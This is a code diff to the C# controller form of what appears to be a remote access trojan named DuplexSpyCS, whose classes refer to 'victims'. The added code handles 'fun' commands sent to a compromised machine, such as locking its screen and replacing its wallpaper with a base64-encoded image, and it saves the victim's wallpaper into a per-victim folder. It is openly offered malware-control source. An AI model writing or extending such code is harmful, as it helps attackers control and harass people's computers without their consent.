@@ -20,7 +20,6 @@ namespace DuplexSpyCS
 {
     public partial class frmFunStuff : Form
     {
-        private clsIniManager ini_manager;
         public clsVictim v;
 
         public frmFunStuff(clsVictim victim)
@@ -28,6 +27,31 @@ namespace DuplexSpyCS
             InitializeComponent();
 
             v = victim;
+        }
+
+        void fnRecv(clsListener listener, clsVictim victim, List<string> lsMsg)
+        {
+            if (!clsTools.fnbVictimEquals(victim, v))
+                return;
+
+            if (lsMsg[0] == "fun")
+            {
+                if (lsMsg[1] == "screen")
+                {
+                    if (lsMsg[2] == "lock")
+                    {
+                        int code = int.Parse(lsMsg[3]);
+                        if (code == 0)
+                        {
+                            MessageBox.Show("Screen is unlocked", "Status", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                        }
+                        else
+                        {
+                            MessageBox.Show("Screen is locked", "Status", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                        }
+                    }
+                }
+            }
         }
 
         void SendFun(params string[] para) => v.SendCommand(string.Join("|", new string[] { "fun" }.Concat(para).ToArray()));
@@ -50,8 +74,21 @@ namespace DuplexSpyCS
             Invoke(new Action(() => toolStripStatusLabel1.Text = "Action successfully."));
         }
 
+        public void fnShowImage(Image img)
+        {
+            Invoke(new Action(() =>
+            {
+                pictureBox1.Image = img;
+            }));
+        }
+
         void setup()
         {
+            v.m_listener.ReceivedDecoded += fnRecv;
+
+            pictureBox1.SizeMode = PictureBoxSizeMode.Zoom;
+            pictureBox1.BackColor = Color.Black;
+
             comboBox1.SelectedIndex = 0;
             comboBox3.SelectedIndex = 0;
             comboBox4.SelectedIndex = 0;
@@ -141,14 +178,7 @@ namespace DuplexSpyCS
                 return;
             }
 
-            string szImgB64 = clsTools.ImageToBase64(img);
-            if (string.IsNullOrEmpty(szImgB64))
-            {
-                MessageBox.Show("Image base64 string is null or empty.", "NULL", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                return;
-            }
-
-            v.fnSendCommand("fun|wp|set|" + szImgB64);
+            v.fnSendCommand("fun|wp|set|" + clsTools.ImageToBase64(szImgFile));
         }
 
         private void button14_Click(object sender, EventArgs e)
@@ -342,6 +372,37 @@ namespace DuplexSpyCS
         private void toolStripMenuItem5_Click(object sender, EventArgs e)
         {
             new frmBoxHelper("Function\\FunStuff").Show();
+        }
+
+        private void toolStripMenuItem6_Click(object sender, EventArgs e)
+        {
+            if (pictureBox1.Image == null)
+                return;
+
+            SaveFileDialog sfd = new SaveFileDialog();
+            sfd.InitialDirectory = v.dir_victim;
+            sfd.Filter = "Jpeg file (*.jpg)|*.jpg";
+            sfd.FileName = "wallpaper.jpg";
+
+            if (sfd.ShowDialog() == DialogResult.OK)
+            {
+                try
+                {
+                    Image img = pictureBox1.Image;
+                    img.Save(sfd.FileName);
+
+                    MessageBox.Show("Save wallpaper successfully:\n" + sfd.FileName, "Save file", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
+                }
+            }
+        }
+
+        private void frmFunStuff_FormClosed(object sender, FormClosedEventArgs e)
+        {
+            v.m_listener.ReceivedDecoded -= fnRecv;
         }
     }
 }
